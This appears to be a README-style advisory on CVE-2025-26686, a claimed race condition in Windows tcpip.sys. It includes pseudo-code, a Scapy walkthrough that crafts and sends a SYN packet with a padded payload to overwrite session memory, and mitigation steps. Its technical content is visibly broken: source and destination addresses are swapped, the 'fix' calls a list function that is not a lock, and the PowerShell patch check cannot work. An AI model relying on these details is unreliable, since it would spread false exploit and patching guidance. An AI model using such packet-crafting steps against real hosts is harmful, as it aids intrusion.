# CVE-2025-26686-The-TCP-IP-Flaw-That-Opens-the-Gates
A critical RCE vulnerability in Windows TCP/IP stack (CVE-2025-26686) leaves sensitive memory unlocked, allowing remote attackers to hijack systems. Exploitable over the network, it risks full compromise. Patch now

**By** Mark Mallia 
 
**Type:** Remote Code Execution (RCE)  
**Severity:** Critical  
**Attack Vector:** Network‑based  
**Affected Systems:** Windows 10, 11 and Server editions

## Executive Summary  

A new flaw identified as **CVE‑2025‑26686** has been discovered in Microsoft’s TCP/IP stack. It stems from a missing lock on a critical region of memory that stores cryptographic keys, session data or network configuration. Because the area is not protected during packet handling, an attacker can read or alter that information over the network and gain local‑admin level access.

---

## What’s the issue?  

The TCP/IP stack in Windows 10/11/Server does not acquire a proper spin‑lock when it writes to certain buffers that hold session data. The missing lock means two packets may race against each other, allowing an attacker to insert malicious code into the buffer before the original process finishes its write.

Key points:  

* The flaw involves **memory regions that can contain cryptographic keys** or other sensitive data.  
* It is **network‑based** – no physical access needed.  
* Attackers who succeed obtain **local‑admin privileges**, effectively taking over the host.

## Technical Analysis  

The vulnerability appears in the `tcpip.sys` module, specifically around the routine that processes inbound TCP segments. The code path responsible for updating the “session data” block should acquire a lock before it writes to memory. In recent Windows releases the lock is omitted in a conditional branch, which can lead to an unprotected write.

A minimal reproducible example is shown below (C++‑style pseudo‑code).  

```cpp
// tcpip.sys – problematic region
void TcpIpHandleSegment(Packet *p)
{
    // … earlier code …

    if (p->flags & SYN_FLAG) {
        /* lock missing here */
        memcpy(&sessionData, p->payload, p->len);
        // … later code …
    }
}
```

In a correctly protected version the critical section would be guarded by an interlocked spin‑lock:  

```cpp
// tcpip.sys – fixed region
void TcpIpHandleSegment(Packet *p)
{
    // … earlier code …

    if (p->flags & SYN_FLAG) {
        _InterlockedPushEntrySList(&SessionLock, &sessionData);
        memcpy(&sessionData, p->payload, p->len);
        // … later code …
    }
}
```

The patch adds a call to `_InterlockedPushEntrySList`, which ensures exclusive access to `sessionData` while it is updated.

## Crafting 

The vulnerability is triggered when an inbound TCP segment that carries a SYN flag reaches tcpip.sys.

To make the packet match that code path, we set the following fields:

Layer	Field	Typical value for CVE‑2025‑26686
IP	src	Target host’s IP address (e.g. 10.0.0.10)
dst	Attacker’s IP (e.g. 192.168.1.2)
TCP	sport	Attacker’s port (e.g. 4444)
dport	Target service’s listening port (e.g. 80 for HTTP)
flags	“S” for SYN to hit the branch in TcpIpHandleSegment

```python
ip_layer = IP(src="10.0.0.10", dst="192.168.1.2")
tcp_layer = TCP(sport=4444, dport=80, flags="S")

# The payload carries the data that will overwrite sessionData in tcpip.sys.
payload = "ExploitKey" + "A"*512   # 512 bytes of crafted content
```

# Combine into a single packet


```python
pkt = ip_layer / tcp_layer / Raw(load=payload)
```
At this point you may verify the packet structure:

```python
pkt.show()
```

The output will reveal fields such as IP → src, dst; TCP → sport, dport, flags; and a Raw payload of 512 bytes.

This is the exact sequence that Windows expects when it processes inbound segments with the SYN flag.

# Dispatch the packet over the network

```python
send(pkt)
```

The command sends the packet directly from your machine into the target host’s TCP/IP stack.

If you are running the script on a Linux VM that has Scapy installed, the packet will reach the Windows machine and trigger the code path in tcpip.sys.

## Impact  

Because the attacker can modify memory that contains cryptographic keys or session configuration, the flaw enables:

1. **Remote exploitation** – an attacker only needs to send a crafted packet.  
2. **Privilege escalation** – the malicious code runs with local‑admin rights once injected.  
3. **Full system compromise** – a successful attack could allow persistence and lateral movement across the network.

## Mitigation Steps  

1. Deploy the vendor‑provided hot‑fix as soon as possible.  
2. Download the latest cumulative update for Windows 10, 11 or Server from Microsoft’s Security Advisory portal.  
3. Patch the affected module manually (for environments that cannot receive a patch immediately).  
4. Run a vulnerability scanner to confirm the fix has been applied correctly.

A quick‑check script can be used to verify the presence of the lock in the system:

```powershell
# Verify the interlocked entry is present in tcpip.sys
Get-ChildItem -Path C:\Windows\System32\tcpip.sys |
    Select-Object Name, @{Name='PatchPresent';Expression={
        $_.FullName -match '_InterlockedPushEntrySList' } }

```

If `PatchPresent` returns `$True`, the mitigation is in place.
